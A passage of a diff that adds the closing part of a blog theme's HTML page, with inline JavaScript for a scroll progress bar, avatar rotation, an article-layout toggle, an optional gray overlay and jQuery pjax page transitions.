+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
